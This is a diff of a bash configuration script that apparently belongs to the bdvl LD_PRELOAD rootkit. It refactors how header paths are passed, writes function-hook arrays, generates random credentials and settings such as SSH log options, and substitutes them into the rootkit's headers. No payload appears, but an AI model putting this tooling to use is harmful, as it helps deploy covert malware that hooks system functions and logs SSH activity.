@@ -1,9 +1,9 @@
-find_var_placeholders(){
+find_var_placeholders(){ # $1 = header paths
     local headers current_var \
           header_path header_vars \
           vars
 
-    headers=(`find_header_paths`)
+    headers=($1)
 
     for w in ${headers[@]}; do
         header_path=$w
@@ -27,11 +27,10 @@ get_setting(){ # $1 = var
     # standard lengths for variable values.
     # values are randomly generated unless a value
     # is otherwise specified at runtime.
-    local default_strlen=8
+    local default_strlen=6
     local default_intlen=4
 
     [[ $var == *"\""* ]] && is_string=1 || is_string=0
-    #[[ $var != *"\""* ]] && is_string=0
 
     [ $is_string == 1 ] && input="`random 'a-z' $default_strlen`"
     [ $is_string == 0 ] && input=`random '1-9' $default_intlen`
@@ -39,7 +38,7 @@ get_setting(){ # $1 = var
     eval "name=\"`printf ${var} | tr -d '\"\?,'`\""
     # this check here determines whether or not there is already
     # a value available for $input to use. (set at runtime or
-    # predefined in one of the scripts)
+    # predefined in one of the scripts, defaults.sh mainly)
     [ ! -z "`printf "${!name}"`" ] && input="${!name}"
     echo "$name = $input" >> $BDVLSO.creds
 
@@ -59,11 +58,10 @@ output_creds(){
     rm $BDVLSO.creds
 }
 
-# every time we overwrite a placeholder, we find all
-# of the header paths for every placeholder. i could just call
-# `find_header_paths` once previously, but here we are.
-overwrite_placeholder(){ # $1 = element of configuration (NEW_VALUE:PLACEHOLDER)
-    local headers=(`find_header_paths`)
+# $1 = element of configuration (NEW_VALUE:PLACEHOLDER)
+# $2 = header paths
+overwrite_placeholder(){
+    local headers=($2)
     IFS=':' read -r var_value var_name <<< "$1"
     for header in ${headers[@]}; do sed -i "s:${var_name}:${var_value}:" $header; done
 }
@@ -73,13 +71,16 @@ populate_new_placeholders(){
 
     echo && secho "Beginning configuration...\n"
 
-    necho "Writing C arrays"
-    write_char_arrays >> $BDVL_H
+    necho "Getting hooks & writing the function name arrays"
+    write_hooks >> $BDVL_H
 
-    local var_placeholders settings index
+    local var_placeholders settings index headers
+
+    necho "Finding header paths"
+    headers=(`find_header_paths`)
 
     necho "Getting variable placeholders and their new values\n"
-    var_placeholders=(`find_var_placeholders`)
+    var_placeholders=(`find_var_placeholders "$headers"`)
     for i in ${!var_placeholders[@]}; do
         local current_var="${var_placeholders[$i]}"
         settings+=(`get_setting "$current_var"`)
@@ -94,13 +95,10 @@ populate_new_placeholders(){
     done
 
     secho "These are your defined/generated settings:"
-    necho "Keep in mind that not all will apply to you if you"
-    necho "have disabled certain things. For example, if LOG_SSH"
-    necho "is disabled, you need not care about 'SSH_LOGS'"
     output_creds
 
     necho "Overwriting old variable placeholders with new settings"
-    for selem in ${settings[@]}; do overwrite_placeholder "$selem"; done
+    for selem in ${settings[@]}; do overwrite_placeholder "$selem" "$headers"; done
 
     if [ $DOCOMPRESS == 1 ]; then
         [ ! -f `bin_path tar` ] && { eecho "Couldn't locate 'tar' on this machine."; exit; }
